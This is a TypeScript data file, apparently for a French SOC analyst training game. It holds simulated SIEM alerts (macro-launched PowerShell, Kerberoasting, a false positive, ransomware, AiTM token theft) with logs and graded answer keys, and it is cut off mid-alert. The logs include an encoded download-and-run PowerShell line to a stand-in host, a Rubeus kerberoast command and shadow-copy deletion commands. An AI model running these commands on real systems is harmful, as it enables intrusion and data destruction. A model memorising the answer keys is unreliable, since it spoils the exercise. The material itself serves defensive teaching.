import type { SiemAlert } from '../types'
import { encodeUtf16Base64 } from '../lib/forensics'
import { r } from './blocks'

export const TACTICS = [
  'Initial Access',
  'Execution',
  'Persistence',
  'Privilege Escalation',
  'Defense Evasion',
  'Credential Access',
  'Discovery',
  'Lateral Movement',
  'Command and Control',
  'Exfiltration',
  'Impact',
]

export const CONTAINMENT_ACTIONS = [
  { id: 'isolate', label: 'Isoler l’hôte (EDR)' },
  { id: 'disable', label: 'Désactiver le compte AD et réinitialiser ses secrets' },
  { id: 'revoke', label: 'Révoquer les sessions M365 et réinitialiser le MFA' },
  { id: 'block-sender', label: 'Bloquer le domaine expéditeur et purger les messages' },
  { id: 'block-c2', label: 'Bloquer l’IP ou le domaine sur le proxy et le pare-feu' },
  { id: 'crisis', label: 'Déclencher la crise : isoler les hôtes et couper les comptes à privilèges' },
  { id: 'close-admin', label: 'Clôturer : activité d’administration autorisée' },
  { id: 'close-tune', label: 'Clôturer : faux positif et correction de la règle' },
]

const payloadMacro = encodeUtf16Base64("IEX (New-Object Net.WebClient).DownloadString('https://cdn-sync-update.example/a.ps1')")
const payloadSccm = 'C:\\Windows\\CCM\\SystemTemp\\Inventaire-Logiciels.ps1'

export const siemAlerts: SiemAlert[] = [
  {
    id: 'ALR-1041',
    title: 'Office lance un PowerShell encodé',
    severity: 'Haute',
    source: 'Defender for Endpoint',
    rule: 'Suspicious Office child process',
    time: '2026-03-12 09:14:22 UTC',
    host: 'FIN-PC-042',
    user: 'CONTOSO\\j.martin',
    summary: 'WINWORD.EXE a engendré une chaîne cmd.exe vers powershell.exe avec commande encodée, puis une connexion sortante.',
    logs: [
      {
        title: 'Sysmon 1 : création de processus',
        lang: 'log',
        content: r`EventID=1 UtcTime=2026-03-12 09:14:22.104 Computer=FIN-PC-042 User=CONTOSO\j.martin
  ParentImage=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
  ParentCommandLine="WINWORD.EXE" /n "C:\Users\j.martin\Downloads\Facture_0342.docm"
  Image=C:\Windows\System32\cmd.exe
  CommandLine=cmd.exe /c powershell -nop -w hidden -enc ${payloadMacro}

EventID=1 UtcTime=2026-03-12 09:14:22.587 Computer=FIN-PC-042 User=CONTOSO\j.martin
  ParentImage=C:\Windows\System32\cmd.exe
  Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  CommandLine=powershell -nop -w hidden -enc ${payloadMacro}`,
      },
      {
        title: 'Sysmon 22 et 3 : DNS et réseau',
        lang: 'log',
        content: r`EventID=22 UtcTime=2026-03-12 09:14:23.012 Image=...\powershell.exe QueryName=cdn-sync-update.example QueryResults=203.0.113.50
EventID=3  UtcTime=2026-03-12 09:14:23.244 Image=...\powershell.exe Initiated=true SourceIp=10.20.4.42 DestinationIp=203.0.113.50 DestinationPort=443 Protocol=tcp`,
      },
      {
        title: 'Passerelle mail : message d’origine',
        lang: 'log',
        content: r`2026-03-12 08:41:10 UTC Delivered From=compta@fournisseur-paiement.example To=j.martin@contoso.example
  Subject="Facture 0342 en retard" Attachment=Facture_0342.docm SPF=softfail DKIM=none DMARC=fail`,
      },
    ],
    tree: {
      name: 'explorer.exe',
      user: 'j.martin',
      pid: 3120,
      children: [
        {
          name: 'WINWORD.EXE',
          cmd: 'WINWORD.EXE /n Downloads\\Facture_0342.docm',
          pid: 6612,
          flag: 'Document à macros',
          children: [
            {
              name: 'cmd.exe',
              cmd: 'cmd.exe /c powershell -nop -w hidden -enc …',
              pid: 7044,
              flag: 'Office ne lance pas de shell',
              children: [
                {
                  name: 'powershell.exe',
                  cmd: 'powershell -nop -w hidden -enc …',
                  pid: 7188,
                  flag: 'Fenêtre masquée et charge encodée',
                  children: [{ name: 'whoami.exe', cmd: 'whoami /all', pid: 7320, flag: 'Reconnaissance' }],
                },
              ],
            },
          ],
        },
      ],
    },
    intel: [
      { type: 'Domaine', value: 'cdn-sync-update.example', verdict: 'Suspect', detail: 'Enregistré il y a 3 jours, certificat Let’s Encrypt, 0 machine de l’entreprise avant ce jour. VirusTotal : 0/70.' },
      { type: 'IP', value: '203.0.113.50', verdict: 'Suspect', detail: 'VPS d’un hébergeur à bas coût, aucun historique de réputation.' },
      { type: 'SHA-256', value: '9f2c6a1e7b4d0c83a5e16d2f4b98c07a3d1e5f60b7c2849ae03d6f1c5b72e8d4', verdict: 'Malveillant', detail: 'Facture_0342.docm. Macro AutoOpen et Shell selon la sandbox interne.' },
      { type: 'Contexte', value: 'j.martin', verdict: 'Inconnu', detail: 'Service Finance. Aucun usage de PowerShell sur 30 jours.' },
    ],
    solution: {
      classification: 'TP',
      tactics: ['Execution'],
      actions: ['isolate'],
      partialActions: ['block-c2', 'disable'],
      reportKeywords: [
        { label: 'Lignée WINWORD vers PowerShell', anyOf: ['winword', 'macro', 'docm', ' word ', 'office', 'facture piegee'] },
        { label: 'Charge encodée ou fenêtre masquée', anyOf: ['-enc', 'encod', 'base64', 'hidden', 'masque'] },
        { label: 'Téléchargement ou destination réseau', anyOf: ['downloadstring', 'cdn-sync-update', '203.0.113.50', 'telecharg'] },
        { label: 'Hôte concerné', anyOf: ['fin-pc-042'] },
        { label: 'Isolement ou escalade', anyOf: ['isol', 'escalad', 'n2', 'niveau 2'] },
      ],
      debrief:
        "La lignée suffit presque à conclure : Word lance cmd, qui lance un PowerShell masqué. Le décodage de la charge montre un IEX + DownloadString, soit une exécution en mémoire. L'absence de détection sur VirusTotal ne compte pas face à un domaine de 3 jours. Le poste est en cours d'exécution d'un implant : on isole.",
      modelReport:
        "Qui : j.martin (Finance) sur FIN-PC-042.\nQuoi : Facture_0342.docm a exécuté une macro ; WINWORD.EXE > cmd.exe > powershell -nop -w hidden -enc. Charge décodée : IEX DownloadString vers cdn-sync-update.example, puis whoami /all.\nQuand : mail reçu à 08:41:10 UTC, exécution à 09:14:22 UTC.\nOù : FIN-PC-042 (10.20.4.42) vers 203.0.113.50:443.\nPourquoi : lignée anormale, furtivité, domaine de 3 jours, DMARC en échec, aucun PowerShell habituel sur ce poste.\nVerdict : TP. Hôte isolé, domaine et SHA-256 bloqués, recherche des autres destinataires, escalade au N2.",
      pitfall: "Bloquer seulement le domaine laisse le code en mémoire et d'éventuels autres canaux actifs. Isoler d'abord, puis bloquer.",
    },
  },
  {
    id: 'ALR-1042',
    title: 'Rafale de tickets Kerberos en RC4',
    severity: 'Haute',
    source: 'Microsoft Sentinel',
    rule: 'Possible Kerberoasting - multiple RC4 TGS requests',
    time: '2026-03-12 11:02:47 UTC',
    host: 'DC01',
    user: 'CONTOSO\\t.lefevre',
    summary: 'Un compte utilisateur standard a demandé 38 tickets de service distincts en RC4 en moins de deux minutes.',
    logs: [
      {
        title: 'Security 4769 sur DC01 (extrait)',
        lang: 'log',
        content: r`EventID=4769 TimeGenerated=2026-03-12 11:02:47 Computer=DC01 TargetUserName=t.lefevre@CONTOSO.LOCAL ServiceName=svc-sql    TicketEncryptionType=0x17 IpAddress=::ffff:10.20.6.88 Status=0x0
EventID=4769 TimeGenerated=2026-03-12 11:02:47 Computer=DC01 TargetUserName=t.lefevre@CONTOSO.LOCAL ServiceName=svc-backup TicketEncryptionType=0x17 IpAddress=::ffff:10.20.6.88 Status=0x0
EventID=4769 TimeGenerated=2026-03-12 11:02:48 Computer=DC01 TargetUserName=t.lefevre@CONTOSO.LOCAL ServiceName=svc-iis    TicketEncryptionType=0x17 IpAddress=::ffff:10.20.6.88 Status=0x0
EventID=4769 TimeGenerated=2026-03-12 11:02:48 Computer=DC01 TargetUserName=t.lefevre@CONTOSO.LOCAL ServiceName=svc-sccm   TicketEncryptionType=0x17 IpAddress=::ffff:10.20.6.88 Status=0x0
... 34 événements supplémentaires jusqu'à 11:04:31`,
      },
      {
        title: 'Agrégation SIEM',
        lang: 'text',
        content: `Requête : 4769 | Enc=0x17 | par compte et par tranche de 10 min
t.lefevre      38 SPN distincts   (moyenne 30 jours : 2 SPN/jour, en AES 0x12)`,
      },
      {
        title: 'Sysmon 1 sur COM-PC-088',
        lang: 'log',
        content: r`EventID=1 UtcTime=2026-03-12 11:02:44 Computer=COM-PC-088 User=CONTOSO\t.lefevre
  ParentImage=C:\Windows\System32\cmd.exe
  Image=C:\Users\t.lefevre\AppData\Local\Temp\ru.exe
  CommandLine=ru.exe kerberoast /rc4opsec /outfile:C:\Users\Public\h.txt
  Hashes=SHA256=4be81d0c72fa6e39d51c08b7ea26c94d3f70a1e6b58d2c47f09e1a3b6dc5784f`,
      },
    ],
    tree: {
      name: 'cmd.exe',
      user: 't.lefevre',
      pid: 5210,
      children: [{ name: 'ru.exe', cmd: 'ru.exe kerberoast /rc4opsec /outfile:C:\\Users\\Public\\h.txt', pid: 5480, flag: 'Binaire dans Temp, arguments typiques de Rubeus' }],
    },
    intel: [
      { type: 'SHA-256', value: '4be81d0c72fa6e39d51c08b7ea26c94d3f70a1e6b58d2c47f09e1a3b6dc5784f', verdict: 'Malveillant', detail: 'Correspond à une compilation connue de Rubeus.' },
      { type: 'Compte', value: 't.lefevre', verdict: 'Suspect', detail: 'Service Commercial. Aucun droit d’administration. Mail de phishing cliqué il y a 2 jours.' },
      { type: 'Contexte', value: 'Calendrier Red Team', verdict: 'Inconnu', detail: 'Aucun test d’intrusion planifié ce mois-ci, confirmé par le RSSI adjoint.' },
    ],
    solution: {
      classification: 'TP',
      tactics: ['Credential Access'],
      actions: ['disable'],
      partialActions: ['isolate', 'crisis'],
      reportKeywords: [
        { label: 'Event 4769', anyOf: ['4769'] },
        { label: 'Chiffrement RC4', anyOf: ['0x17', 'rc4'] },
        { label: 'Kerberoasting ou Rubeus', anyOf: ['kerberoast', 'rubeus', 'ru.exe'] },
        { label: 'Comptes de service à renouveler', anyOf: ['svc-', 'compte de service', 'comptes de service', 'spn'] },
        { label: 'Compte concerné', anyOf: ['t.lefevre', 'lefevre'] },
      ],
      debrief:
        "Le volume (38 SPN en moins de 2 minutes) et le binaire `ru.exe` avec `kerberoast` ne laissent aucun doute. Aucun pentest n'étant planifié, c'est bien un TP. Le danger immédiat n'est pas le poste, mais le fait que les hash des comptes de service peuvent être cassés hors ligne : il faut couper le compte, puis renouveler les mots de passe de tous les comptes de service concernés.",
      modelReport:
        "Qui : t.lefevre (Commercial), compte probablement compromis après un phishing.\nQuoi : Kerberoasting avec ru.exe (Rubeus) : 38 tickets de service en RC4 (4769, 0x17).\nQuand : 11:02:44 à 11:04:31 UTC.\nOù : COM-PC-088 (10.20.6.88) vers DC01. Résultats dans C:\\Users\\Public\\h.txt.\nPourquoi : aucun test planifié, volume sans rapport avec la moyenne de 2 SPN/jour, binaire connu.\nVerdict : TP. Compte désactivé, poste isolé, renouvellement des comptes de service concernés avec des mots de passe longs, escalade au N2.",
      pitfall: "Oublier les comptes de service. Le fichier de hash est peut-être déjà sorti : même après la désactivation de t.lefevre, le cassage hors ligne continue.",
    },
  },
  {
    id: 'ALR-1043',
    title: 'PowerShell avec commande encodée sur 214 postes',
    severity: 'Moyenne',
    source: 'Splunk',
    rule: 'Encoded PowerShell : Image=*\\powershell.exe CommandLine=*-enc*',
    time: '2026-03-12 02:00:04 UTC',
    host: '214 postes (ex. : RH-PC-017)',
    user: 'NT AUTHORITY\\SYSTEM',
    summary: 'La règle PowerShell encodée a levé 214 alertes en 5 minutes, à 02:00, sur l’ensemble du parc.',
    logs: [
      {
        title: 'Sysmon 1 (échantillon)',
        lang: 'log',
        content: r`EventID=1 UtcTime=2026-03-12 02:00:04 Computer=RH-PC-017 User=NT AUTHORITY\SYSTEM
  ParentImage=C:\Windows\CCM\CcmExec.exe
  Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  CommandLine=powershell.exe -ExecutionPolicy Bypass -NoProfile -File "${payloadSccm}" -OutFile C:\Windows\CCM\Logs\inv.csv -Encoding UTF8
  Hashes=SHA256=de96a0d8e5c1b47f3a02689f1ec7d43b508a6f92c1e74d30b8f5a1c967e2d04b
  Signature=Microsoft Windows Status=Valid`,
      },
      {
        title: 'Logique de la règle',
        lang: 'spl',
        content: r`index=windows EventCode=1 Image="*\\powershell.exe" CommandLine="*-enc*"`,
      },
      {
        title: 'Historique de la commande',
        lang: 'text',
        content: `Même ligne de commande : toutes les nuits à 02:00 depuis 7 semaines.
Le script était déjà référencé dans SCCM avant la création de la règle (activée hier à 18:30).`,
      },
    ],
    tree: {
      name: 'CcmExec.exe',
      user: 'SYSTEM',
      pid: 2204,
      children: [{ name: 'powershell.exe', cmd: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -File Inventaire-Logiciels.ps1 -OutFile inv.csv -Encoding UTF8', pid: 8120, flag: '-Encoding, pas -EncodedCommand' }],
    },
    intel: [
      { type: 'SHA-256', value: 'de96a0d8e5c1b47f3a02689f1ec7d43b508a6f92c1e74d30b8f5a1c967e2d04b', verdict: 'Légitime', detail: 'powershell.exe signé par Microsoft.' },
      { type: 'Contexte', value: 'Inventaire-Logiciels.ps1', verdict: 'Légitime', detail: 'Script du dépôt SCCM. Aucune modification depuis 7 semaines.' },
      { type: 'Contexte', value: 'Règle', verdict: 'Inconnu', detail: 'Règle activée hier, sans test sur l’historique.' },
    ],
    solution: {
      classification: 'FP',
      tactics: ['Execution'],
      actions: ['close-tune'],
      partialActions: ['close-admin'],
      reportKeywords: [
        { label: '-Encoding au lieu de -EncodedCommand', anyOf: ['-encoding', 'encoding'] },
        { label: 'Règle trop large à corriger', anyOf: ['regle', 'tuning', 'regex', '*-enc*'] },
        { label: 'SCCM comme parent', anyOf: ['sccm', 'ccmexec'] },
        { label: 'Aucune charge encodée', anyOf: ['pas de base64', 'aucune charge', 'aucun base64', 'pas encode', 'pas de commande encodee', 'sans charge', 'aucune commande encodee', 'pas de charge', 'aucun encodage', 'non encodee', 'aucune valeur encodee'] },
      ],
      debrief:
        "Lisez la logique de la règle : `*-enc*` correspond à `-Encoding UTF8`. Aucune commande encodée n'existe ici. Le comportement visé n'a jamais eu lieu : c'est un **FP**, et non un B-TP. La bonne suite n'est pas seulement de clôturer, mais de corriger la règle, sans exclure SCCM globalement (car un attaquant pourrait se cacher derrière).",
      modelReport:
        "Qui : SYSTEM via CcmExec.exe sur 214 postes.\nQuoi : la règle *-enc* a correspondu à l'argument -Encoding UTF8 d'un script d'inventaire. Aucune charge encodée : pas de -EncodedCommand ni de Base64.\nQuand : 02:00:04 UTC, chaque nuit depuis 7 semaines.\nOù : parc complet, chemin C:\\Windows\\CCM\\SystemTemp.\nPourquoi : parent SCCM attendu, binaire signé, script inchangé, règle récente non testée sur l'historique.\nVerdict : FP. Clôture et correction de la règle avec une regex exigeant une valeur Base64.",
      pitfall: 'Conclure B-TP : ici, le comportement n’a pas eu lieu. Autre erreur : exclure `CcmExec.exe` entièrement, ce qui crée un angle mort.',
    },
  },
  {
    id: 'ALR-1044',
    title: 'Nouveau compte ajouté au groupe Administrateurs',
    severity: 'Moyenne',
    source: 'Microsoft Sentinel',
    rule: 'User added to privileged group',
    time: '2026-03-12 14:21:09 UTC',
    host: 'SRV-APP02',
    user: 'CONTOSO\\adm.dupont',
    summary: 'adm.dupont a créé un compte puis l’a ajouté au groupe local Administrateurs de SRV-APP02.',
    logs: [
      {
        title: 'Security sur SRV-APP02',
        lang: 'log',
        content: r`EventID=4720 Time=2026-03-12 14:21:02 Computer=SRV-APP02 SubjectUserName=adm.dupont TargetUserName=svc-erp-migr
EventID=4722 Time=2026-03-12 14:21:02 Computer=SRV-APP02 SubjectUserName=adm.dupont TargetUserName=svc-erp-migr
EventID=4732 Time=2026-03-12 14:21:09 Computer=SRV-APP02 SubjectUserName=adm.dupont MemberName=SRV-APP02\svc-erp-migr TargetUserName=Administrators`,
      },
      {
        title: 'Session de l’administrateur',
        lang: 'log',
        content: r`EventID=4624 Time=2026-03-12 14:18:33 Computer=SRV-APP02 LogonType=10 TargetUserName=adm.dupont IpAddress=10.10.1.5
(10.10.1.5 = BASTION01, seul point d'administration autorisé)
EventID=1 Time=2026-03-12 14:21:00 User=CONTOSO\adm.dupont ParentImage=C:\Windows\explorer.exe Image=C:\Windows\System32\mmc.exe CommandLine="mmc.exe" lusrmgr.msc`,
      },
      {
        title: 'ITSM : ticket de changement',
        lang: 'text',
        content: `CHG-20871 | Statut : Approuvé | Demandeur : Équipe ERP | Validateur : RSSI adjoint
Objet : création du compte local svc-erp-migr sur SRV-APP02 pour la migration ERP
Fenêtre : 12/03/2026 14:00 à 16:00 UTC | Exécutant : adm.dupont`,
      },
    ],
    tree: {
      name: 'explorer.exe',
      user: 'adm.dupont',
      pid: 1420,
      children: [{ name: 'mmc.exe', cmd: 'mmc.exe lusrmgr.msc', pid: 4412, flag: 'Console graphique standard' }],
    },
    intel: [
      { type: 'IP', value: '10.10.1.5', verdict: 'Légitime', detail: 'BASTION01, point d’administration prévu.' },
      { type: 'Compte', value: 'adm.dupont', verdict: 'Légitime', detail: 'Administrateur serveur. Confirmé par téléphone à 14:30 UTC.' },
      { type: 'Contexte', value: 'CHG-20871', verdict: 'Légitime', detail: 'Ticket approuvé qui correspond : compte, hôte, fenêtre, exécutant.' },
    ],
    solution: {
      classification: 'B-TP',
      tactics: ['Persistence', 'Privilege Escalation'],
      actions: ['close-admin'],
      partialActions: [],
      reportKeywords: [
        { label: 'Ticket de changement', anyOf: ['chg-20871', 'chg', 'ticket', 'changement'] },
        { label: 'Events 4720 ou 4732', anyOf: ['4720', '4732'] },
        { label: 'Bastion', anyOf: ['bastion', '10.10.1.5'] },
        { label: 'Confirmation hors bande', anyOf: ['confirm', 'telephone', 'appel'] },
      ],
      debrief:
        "Le comportement a bien eu lieu : ce n'est donc pas un FP. Mais tout concorde : ticket approuvé, fenêtre horaire, exécutant, hôte, session depuis le bastion, confirmation par un second canal. C'est un B-TP. Notez la vérification hors bande : un attaquant qui contrôle `adm.dupont` pourrait aussi utiliser une console graphique.",
      modelReport:
        "Qui : adm.dupont depuis BASTION01 (10.10.1.5).\nQuoi : création de svc-erp-migr (4720), activation (4722), ajout au groupe Administrators (4732) via lusrmgr.msc.\nQuand : 14:21:02 à 14:21:09 UTC, dans la fenêtre 14:00-16:00 UTC.\nOù : SRV-APP02.\nPourquoi : CHG-20871 approuvé correspond au compte, à l'hôte, à la fenêtre et à l'exécutant ; confirmation par téléphone à 14:30 UTC.\nVerdict : B-TP. Clôture comme activité autorisée. Demander la suppression du compte après la migration.",
      pitfall: "Conclure FP alors que le comportement est réel. Autre erreur : clôturer sur la seule base du ticket, sans vérifier que l'exécution lui correspond.",
    },
  },
  {
    id: 'ALR-1045',
    title: 'Suppression des clichés et chiffrement massif',
    severity: 'Critique',
    source: 'CrowdStrike Falcon',
    rule: 'Ransomware : shadow copy deletion and mass file rename',
    time: '2026-03-14 01:37:12 UTC',
    host: 'FILESRV01, SRV-APP02, SRV-DB03',
    user: 'CONTOSO\\svc-backup',
    summary: 'PsExec depuis SRV-APP02 vers plusieurs serveurs, suppression des clichés instantanés et milliers de fichiers renommés en .lockd.',
    logs: [
      {
        title: 'Security et System sur FILESRV01',
        lang: 'log',
        content: r`EventID=4624 Time=2026-03-14 01:36:41 Computer=FILESRV01 LogonType=3 TargetUserName=svc-backup IpAddress=10.30.2.12 AuthenticationPackageName=NTLM
EventID=5145 Time=2026-03-14 01:36:42 Computer=FILESRV01 ShareName=\\*\ADMIN$ RelativeTargetName=PSEXESVC.exe AccessMask=0x2 SubjectUserName=svc-backup
EventID=7045 Time=2026-03-14 01:36:43 Computer=FILESRV01 ServiceName=PSEXESVC ImagePath=%SystemRoot%\PSEXESVC.exe ServiceAccount=LocalSystem`,
      },
      {
        title: 'EDR : processus sur FILESRV01',
        lang: 'log',
        content: r`01:37:02 C:\Windows\PSEXESVC.exe -> C:\ProgramData\lk.exe -path D:\Partages -threads 16
01:37:05 C:\ProgramData\lk.exe -> cmd.exe /c vssadmin delete shadows /all /quiet
01:37:06 C:\ProgramData\lk.exe -> cmd.exe /c wbadmin delete catalog -quiet
01:37:06 C:\ProgramData\lk.exe -> cmd.exe /c bcdedit /set {default} recoveryenabled no
01:37:12 FileRename x 18 412 en 60 s : *.docx -> *.docx.lockd
01:37:14 FileCreate D:\Partages\Finance\LISEZMOI_lockd.txt`,
      },
      {
        title: 'Propagation',
        lang: 'text',
        content: `SRV-APP02 (10.30.2.12) -> FILESRV01  01:36:41  PsExec
SRV-APP02 (10.30.2.12) -> SRV-DB03   01:38:09  PsExec
SRV-APP02 (10.30.2.12) -> SRV-HV01   01:39:30  PsExec  (en cours)
Compte utilisé : svc-backup (Domain Admins, mot de passe inchangé depuis 2021)`,
      },
    ],
    tree: {
      name: 'PSEXESVC.exe',
      user: 'SYSTEM',
      pid: 3004,
      flag: 'Service distant PsExec',
      children: [
        {
          name: 'lk.exe',
          cmd: 'lk.exe -path D:\\Partages -threads 16',
          pid: 3388,
          flag: 'Charge du ransomware',
          children: [
            { name: 'vssadmin.exe', cmd: 'vssadmin delete shadows /all /quiet', pid: 3420, flag: 'Destruction des clichés' },
            { name: 'wbadmin.exe', cmd: 'wbadmin delete catalog -quiet', pid: 3431, flag: 'Destruction du catalogue' },
            { name: 'bcdedit.exe', cmd: 'bcdedit /set {default} recoveryenabled no', pid: 3440, flag: 'Récupération désactivée' },
          ],
        },
      ],
    },
    intel: [
      { type: 'SHA-256', value: 'a7c41e0f93d2586b1ea0f47c36d82b95e104cf7a68d3b2195ef06c7d4a8b31e2', verdict: 'Malveillant', detail: 'lk.exe : ransomware connu, double extorsion selon le CTI.' },
      { type: 'Compte', value: 'svc-backup', verdict: 'Suspect', detail: 'Domain Admins. Sauvegardes normalement exécutées depuis SRV-BKP01 uniquement, et jamais via PsExec.' },
      { type: 'Contexte', value: 'Changement', verdict: 'Inconnu', detail: 'Aucune opération de maintenance planifiée.' },
    ],
    solution: {
      classification: 'TP',
      tactics: ['Impact'],
      actions: ['crisis'],
      partialActions: ['isolate', 'disable'],
      reportKeywords: [
        { label: 'PsExec ou mouvement latéral', anyOf: ['psexec', 'psexesvc', 'lateral', '7045'] },
        { label: 'Destruction des clichés', anyOf: ['vssadmin', 'shadow', 'cliches', 'wbadmin'] },
        { label: 'Chiffrement', anyOf: ['chiffr', 'ransom', 'lockd'] },
        { label: 'Compte svc-backup', anyOf: ['svc-backup'] },
        { label: 'Hôtes et propagation', anyOf: ['filesrv01', 'srv-app02', 'srv-db03', 'srv-hv01'] },
      ],
      debrief:
        "Chaque minute compte : la propagation vise maintenant un hyperviseur. Isoler un hôte ne suffit pas, car la cause est un compte Domain Admins utilisé depuis SRV-APP02. Déclenchez la crise : coupez `svc-backup` et les comptes à privilèges exposés, segmentez SMB/RDP/WinRM, gardez les machines allumées et préservez les sauvegardes hors ligne.",
      modelReport:
        "Qui : compte svc-backup (Domain Admins), source SRV-APP02.\nQuoi : propagation PsExec (PSEXESVC, 7045), puis lk.exe : vssadmin delete shadows, wbadmin, bcdedit, 18 412 fichiers chiffrés en .lockd, note de rançon.\nQuand : 01:36:41 UTC, toujours en cours à 01:39:30 UTC.\nOù : FILESRV01, SRV-DB03, SRV-HV01 en cours.\nPourquoi : aucune maintenance, chiffrement avéré, SHA-256 connu.\nVerdict : TP critique. Crise déclenchée, svc-backup coupé, segmentation, isolement sans extinction, sauvegardes hors ligne protégées.",
      pitfall: "Éteindre les serveurs détruit la mémoire. Isoler un seul hôte laisse la source et le compte actifs.",
    },
  },
  {
    id: 'ALR-1046',
    title: 'Connexion impossible et règle de boîte cachée',
    severity: 'Haute',
    source: 'Microsoft Entra ID Protection',
    rule: 'Anomalous token + suspicious inbox rule',
    time: '2026-03-13 16:48:30 UTC',
    host: 'Tenant M365',
    user: 's.bernard@contoso.example',
    summary: 'Après un clic sur un lien, une session vient d’une nouvelle IP avec la MFA déjà satisfaite, puis une règle de boîte masque des messages.',
    logs: [
      {
        title: 'UrlClickEvents et SigninLogs',
        lang: 'log',
        content: r`16:41:12 UrlClick AccountUpn=s.bernard@contoso.example Url=https://login-m365.example/common/oauth2 ActionType=ClickAllowed
16:41:58 SigninLogs UPN=s.bernard ResultType=0 IPAddress=198.51.100.23 AppDisplayName="OfficeHome" Location=FR AuthenticationRequirement=multiFactorAuthentication MfaResult=Satisfied
16:42:03 SigninLogs UPN=s.bernard ResultType=0 IPAddress=203.0.113.141 AppDisplayName="OfficeHome" Location=NL DeviceDetail.browser="Python Requests" AuthenticationRequirement=multiFactorAuthentication AuthenticationDetails="MFA requirement satisfied by claim in the token" RiskLevel=high`,
      },
      {
        title: 'OfficeActivity',
        lang: 'log',
        content: r`16:44:20 Operation=New-InboxRule ClientIP=203.0.113.141 UserId=s.bernard@contoso.example
  Parameters: Name="." SubjectContainsWords="virement;facture;RIB" MoveToFolder="RSS Subscriptions" MarkAsRead=True StopProcessingRules=True
16:46:02 Operation=MailItemsAccessed ClientIP=203.0.113.141 Count=214
16:47:45 Operation=Send ClientIP=203.0.113.141 Subject="RIB mis à jour" Recipients=14 (fournisseurs)`,
      },
    ],
    treeNote: 'Incident cloud : aucun processus suspect n’a tourné sur le poste. Cette vue montre la chaîne d’activité de la session, à la place d’une lignée de processus.',
    tree: {
      name: 'Clic dans le mail',
      user: 's.bernard',
      cmd: 'https://login-m365.example/common/oauth2',
      flag: 'Lien vers un relais AiTM',
      children: [
        {
          name: 'Session rejouée depuis 203.0.113.141',
          cmd: 'Client Python Requests, 5 s après la MFA réussie',
          flag: 'MFA satisfaite par le jeton volé',
          children: [
            { name: 'New-InboxRule', cmd: 'Name="." MoveToFolder="RSS Subscriptions" SubjectContainsWords="virement;facture;RIB"', flag: 'Masque les réponses' },
            { name: 'MailItemsAccessed', cmd: '214 messages lus' },
            { name: 'Send', cmd: '« RIB mis à jour » vers 14 fournisseurs', flag: 'Fraude au virement' },
          ],
        },
      ],
    },
    intel: [
      { type: 'Domaine', value: 'login-m365.example', verdict: 'Malveillant', detail: 'Relais AiTM de type kit Evilginx. Enregistré il y a 5 jours.' },
      { type: 'IP', value: '203.0.113.141', verdict: 'Malveillant', detail: 'VPS NL. Vu dans d’autres campagnes AiTM selon le TIP.' },
      { type: 'IP', value: '198.51.100.23', verdict: 'Légitime', detail: 'Bureau de Lyon. Poste habituel de s.bernard.' },
      { type: 'Contexte', value: 's.bernard', verdict: 'Inconnu', detail: 'Comptabilité fournisseurs. MFA par notification.' },
    ],
    solution: {
      classification: 'TP',
      tactics: ['Credential Access', 'Initial Access'],
      actions: ['revoke'],
      partialActions: ['block-sender', 'disable', 'block-c2'],
      reportKeywords: [
        { label: 'AiTM ou vol de jeton', anyOf: ['aitm', 'jeton', 'token', 'evilginx', 'cookie'] },
        { label: 'Règle de boîte', anyOf: ['inbox', 'regle de boite', 'new-inboxrule', 'regle cachee', 'regle'] },
        { label: 'IP de l’attaquant', anyOf: ['203.0.113.141'] },
        { label: 'Fraude ou mails envoyés', anyOf: ['fournisseur', 'rib', 'virement', '14 '] },
        { label: 'Révocation', anyOf: ['revoqu', 'revoke', 'revocation'] },
      ],
      debrief:
        "La MFA a réussi, et pourtant le compte est compromis : c'est le signe d'un AiTM. Le proxy relaie la vraie page et vole le jeton de session. Changer le mot de passe seul ne suffit pas : il faut révoquer les sessions, réinitialiser les méthodes MFA, supprimer la règle et prévenir les 14 fournisseurs pour stopper la fraude au virement.",
      modelReport:
        "Qui : s.bernard, attaquant depuis 203.0.113.141.\nQuoi : phishing AiTM via login-m365.example, vol de jeton, règle de boîte cachée (New-InboxRule, Name=\".\"), lecture de 214 mails, envoi de « RIB mis à jour » à 14 fournisseurs.\nQuand : clic à 16:41:12 UTC, envois à 16:47:45 UTC.\nOù : tenant M365, depuis NL.\nPourquoi : connexions à 5 s d'intervalle depuis 2 pays, client Python Requests, jeton réutilisé, règle visant virement/facture/RIB.\nVerdict : TP. Sessions révoquées, MFA réinitialisé, mot de passe changé, règle supprimée, domaine bloqué, fournisseurs et finance alertés.",
      pitfall: "Réinitialiser le mot de passe sans révoquer les sessions. Le jeton volé reste valide. Oublier la règle laisse aussi l'attaquant lire la réponse des fournisseurs.",
    },
  },
  {
    id: 'ALR-1047',
    title: 'rundll32 communique à intervalle régulier',
    severity: 'Haute',
    source: 'Zeek et proxy Squid',
    rule: 'Regular beaconing to rare domain',
    time: '2026-03-15 03:20:00 UTC',
    host: 'RD-WS-019',
    user: 'CONTOSO\\p.moreau',
    summary: 'Depuis 41 heures, un processus contacte toutes les 60 s un domaine vu sur aucune autre machine, y compris le week-end.',
    logs: [
      {
        title: 'Proxy (extrait)',
        lang: 'log',
        content: r`2026-03-15 03:14:04 10.40.3.19 GET https://static-assets-eu.example/jquery-3.3.1.min.js 200 5543 UA="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)"
2026-03-15 03:15:07 10.40.3.19 GET https://static-assets-eu.example/jquery-3.3.1.min.js 200 5543 UA="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)"
2026-03-15 03:16:02 10.40.3.19 GET https://static-assets-eu.example/jquery-3.3.1.min.js 200 5543 UA="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)"
2026-03-15 03:17:05 10.40.3.19 GET https://static-assets-eu.example/jquery-3.3.1.min.js 200 5543 UA="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)"
2026-03-15 03:18:01 10.40.3.19 POST https://static-assets-eu.example/jquery-3.3.2.min.js 200 18244 UA="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)"`,
      },
      {
        title: 'Pare-feu périmétrique FW-EDGE01',
        lang: 'log',
